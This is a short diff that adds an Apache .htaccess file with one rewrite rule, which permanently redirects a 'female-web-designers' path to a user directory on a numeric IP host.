@@ -1,0 +1,4 @@
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule female-web-designers http://50.87.248.116/~drawini3/about/ [L,R=301]
+
